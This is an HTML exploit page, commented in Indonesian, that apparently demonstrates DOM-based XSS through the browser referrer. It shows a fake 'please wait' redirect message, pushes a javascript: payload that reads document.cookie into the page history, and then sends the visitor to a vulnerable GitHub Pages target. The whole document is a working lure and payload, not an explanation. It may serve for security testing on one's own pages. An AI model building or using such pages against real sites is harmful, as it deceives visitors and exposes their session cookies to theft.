<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Halaman Penyerang (Exploit)</title>
</head>
<body>
    <h1>Memproses... Mohon Tunggu</h1>
    <p>Situs ini sedang mengarahkan Anda ke halaman tujuan.</p>

    <script>
        // 1. Manipulasi URL di kolom alamat domain penyerang menjadi payload XSS
        // Hal ini membuat browser mencatat payload tersebut ke dalam history/referrer
        const payload = "javascript:alert('Kena DOM XSS! Cookie Anda: ' + document.cookie)";
        history.pushState({}, '', payload);

        // 2. Alihkan korban ke halaman target yang rentan di GitHub Pages Anda
        setTimeout(() => {
            window.location.href = "https://cyberrgen002.github.io/tes-referer/";
        }, 1000);
    </script>
</body>
</html>
